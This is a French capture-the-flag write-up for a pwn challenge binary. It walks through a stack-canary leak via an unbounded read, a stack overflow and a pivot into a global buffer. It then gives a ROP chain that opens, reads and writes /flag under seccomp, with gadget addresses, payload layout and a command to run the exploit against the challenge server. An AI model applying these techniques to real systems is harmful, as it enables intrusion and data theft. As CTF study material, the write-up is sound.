# Le cœur de laiton (HacKagou 2026) — Pwn

**Flag :** `OPENNC{caa47bc6-8660-45d1-a0e6-0db246fa1e8e}` *(lu dans `/flag` sur l'instance distante ; UUID unique par instance)*
**Valeur :** 250 pts
**Statut :** ✅ résolu — exploit tiré contre `nc challs.hackagou.nc 47677`, flag distant exfiltré et validé par CTFd.

## Énoncé

> Console de réveil du *Cœur de Laiton* — système embarqué sous verrouillage « Marée Noire » (LEVIATHAN). Un menu permet de lancer des diagnostics, de charger une bande de commande et d'injecter une séquence de réveil. Service `nc`, binaire fourni.

Fichier : `47_coeur` (ELF x86-64, **statique**, not stripped).

## Reconnaissance

```
$ file 47_coeur
ELF 64-bit LSB executable, x86-64, statically linked, not stripped
```

- **No-PIE** (`Type: EXEC`) → toutes les adresses sont fixes, aucune fuite d'adresse nécessaire.
- **NX**, **RELRO partiel**, **canary présent** (`__stack_chk_fail` dans chaque fonction).
- **Statique** → mine de gadgets ROP, mais pas de libc à leaker.
- **seccomp** installé au démarrage par `maree_noire_lockdown` (voir plus bas).

`main` (`0x401cdd`) : `io_init()` → `fopen("/flag_public","r")` (leurre, aussitôt refermé) → `maree_noire_lockdown()` (seccomp) → `menu()`.

`io_init` (`0x4018d5`) : `setvbuf(stdout,0,_IONBF,0)` et `setvbuf(stdin,0,_IONBF,0)` — **stdin/stdout non bufferisés** (mode `2`). Point crucial : `fgets` (menu) et `read()` brut ne se désynchronisent pas, on peut enchaîner proprement les étapes.

`menu` (`0x401bdf`) — boucle infinie, sélecteur lu par `fgets` :
- `1` → `diagnostics()` *(reboucle)* — **primitive de fuite**
- `2` → `load_tape()` *(reboucle)* — **écriture dans un buffer global connu**
- `3` → `inject()` puis **sortie du menu** (retour via `ret`) — **le débordement**
- `4` → quitter

### Fonctions leurres

- `fake_gadgets` (`0x401d5d`) : contient un faux `pop rdi ; pop rsi ; call …`. Mais à `0x401d77` il y a un vrai `pop rdi ; ret` parfaitement exploitable.
- `routine_soupape_000`, `routine_turbine_001`, … (`0x401d99`+) : simples boucles de XOR sur leur argument, sans intérêt (leurres).
- `/flag_public` (`0x4862c2`) : flag public leurre. Le vrai flag est `/flag`.

## Vulnérabilités & primitives

### 1) Fuite du canary — `diagnostics` (`0x4019e5`)

La fonction remplit un tableau local de 16 qwords `array = [rbp-0xa0]` avec des sentinelles, lit un index (`strtol`, long signé) et appelle `diag_read_slot(&array, index)`. **Seul contrôle : `index >= 0`** (sinon « indice invalide »).

`diag_read_slot` (`0x40867a`) :
```asm
mov  rax, rsi            ; index
imul rax, rsi            ; index*index
sub  rax, rsi            ; index*(index-1)  -> toujours PAIR
and  rax, 1              ; ... donc toujours 0
add  rsi, rax            ; rsi += 0  (no-op obfusqué)
mov  rax, [rdi + rsi*8]  ; return array[index]  (AUCUNE borne)
```
Le `& 1` sur un produit d'entiers consécutifs vaut toujours `0` : c'est de l'obfuscation, la fonction renvoie simplement `array[index]` en qword, **lecture hors-bornes positive non bornée** sur la pile.

Disposition : `array` à `[rbp-0xa0]`, canary à `[rbp-0x8]` → écart `0x98` = 152 octets = **index 19**. Le canary (constant pour le thread) se lit donc avec l'index `19`. L'affichage utilise le format `valeur@%ld = %#lx` → on parse directement la valeur hex.

### 2) Buffer global pour le stage-2 — `load_tape` (`0x401afc`)

```asm
mov edx, 0x400
lea rax, [payload]       ; 0x4b63e0 (bss, symbole global, 1024 octets)
mov rsi, rax
mov edi, 0
call read                ; read(0, payload, 0x400)
```
On dispose d'une **écriture de 1024 octets à une adresse fixe connue** (`payload @ 0x4b63e0`). C'est là qu'on dépose toute la chaîne ROP, puis on y pivote.

### 3) Le débordement — `inject` (`0x401b71`)

```asm
sub  rsp, 0x30
...stack canary...
lea  rax, [rbp-0x30]     ; buf
mov  edx, 0x60           ; 96
mov  rsi, rax
mov  edi, 0
call read                ; read(0, buf, 0x60)   -> 96 octets
printf("Injecte : %.8s", buf)   ; n'affiche que 8 octets -> pas de leak ici
```

`buf = [rbp-0x30]`, canary = `[rbp-0x8]`. Offset buf→canary = `0x28` = **40 octets**. Avec 96 octets lus :

| offset | contenu |
|-------:|---------|
| 0..40  | padding |
| 40..48 | **canary** (fuité à l'étape 1) |
| 48..56 | saved rbp |
| 56..64 | **adresse de retour** |
| 64..96 | 4 qwords supplémentaires |

Soit seulement **5 qwords** contrôlables à partir du `ret` → trop court pour une chaîne open/read/write complète. D'où le **pivot de pile** vers `payload`.

## Seccomp — `maree_noire_lockdown` (`0x40193f`)

`prctl(PR_SET_NO_NEW_PRIVS,1)` puis `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)`. Le programme BPF (41 `sock_filter`, 328 octets) est en `.rodata` à `0x486020`. Décodage manuel : vérifie l'architecture `AUDIT_ARCH_X86_64` (sinon `KILL_PROCESS`), puis une liste blanche `JEQ nr / RET ALLOW`, défaut `RET KILL_PROCESS`.

**Syscalls autorisés :**
`read(0)`, `write(1)`, `open(2)`, `close(3)`, `fstat(5)`, `lseek(8)`, `mmap(9)`, `mprotect(10)`, `munmap(11)`, `brk(12)`, `rt_sigreturn(15)`, `exit(60)`, `arch_prctl(158)`, `exit_group(231)`, `openat(257)`, `newfstatat(262)`, `getrandom(318)`, `statx(332)`.

**`execve`/`execveat` interdits** → pas de shell. En revanche **`open` (2) ET `read`/`write` sont autorisés** → **open/read/write (ORW)** classique sur `/flag`.

## Gadgets (binaire statique)

Recherche par motif d'octets sur `.text` (ou `ROPgadget` côté Kali) :

| gadget | adresse |
|--------|---------|
| `pop rdi ; ret` | `0x401d77` (dans `fake_gadgets`, bien réel) |
| `pop rsi ; pop rbp ; ret` | `0x411d66` |
| `pop rdx ; ret` | `0x454d62` |
| `pop rax ; ret` | `0x431b3b` |
| `syscall ; ret` | `0x418ec6` |
| `pop rsp ; ret` *(pivot)* | `0x4410b8` |

*(Pas de `pop rsi ; ret` isolé dans le binaire ; on utilise `pop rsi ; pop rbp ; ret` et on ignore le rbp.)*

## Exploitation — enchaînement

1. **`1`** puis **`19`** → fuite du canary (`valeur@19 = 0x…`).
2. **`2`** → `read(0, payload, 0x400)` : on dépose dans `payload @ 0x4b63e0` toute la chaîne ROP ORW, plus la chaîne `"/flag"` (offset `0x180`) et un tampon de lecture (offset `0x200`).
3. **`3`** → débordement de `inject` :
   `40*'A'` + `canary` + `saved_rbp` + `pop rsp;ret` + `&payload`.
   Au `ret`, `pop rsp` charge `rsp = 0x4b63e0` : **pivot** sur la chaîne du stage-2.

Chaîne ROP exécutée depuis `payload` :
```
open("/flag", 0, 0)            ; rax=2  -> fd=3
read(3, payload+0x200, 0x100)  ; rax=0
write(1, payload+0x200, 0x100) ; rax=1  -> flag renvoyé sur stdout
exit_group(0)
```

### Preuve — test local réussi

Un `/flag` de test (`OPENNC{TEST_LOCAL_laiton}`) a été créé, puis l'exploit lancé contre le binaire local :

```
$ python3 exploit.py
[*] cible locale : .../ctfd-downloads/47_coeur (flag=/flag)
[+] canary fuite = 0xa4306fe1e5e86f00
[+] stage-2 (768 octets) charge dans payload @ 0x4b63e0
[+] sortie brute :
b'\nInjecte : AAAAAAAA\nOPENNC{TEST_LOCAL_laiton}\n\x00\x00...'
[FLAG] OPENNC{TEST_LOCAL_laiton}
```

Le canary se termine bien par `0x00` (octet nul de poids faible), la chaîne ORW exfiltre le contenu de `/flag`. ✔

### Contre l'instance

```bash
python3 exploit.py challs.hackagou.nc <port>
```
Le script est en **socket Python pur** (aucune dépendance `pwntools`), il tourne tel quel côté Ubuntu. En local (`python3 exploit.py` sans argument) il pilote le binaire via `subprocess`. Variable d'env `LOCAL_FLAG` pour tester sans toucher à `/flag`.

Script complet : [`exploit.py`](exploit.py).

## Flag

```
OPENNC{caa47bc6-8660-45d1-a0e6-0db246fa1e8e}
```
*(lu dans `/flag` sur l'instance `:47677`. `/flag_public` = leurre `OPENNC{c0eur_d3coy_f4k3_fl4g}`.)*
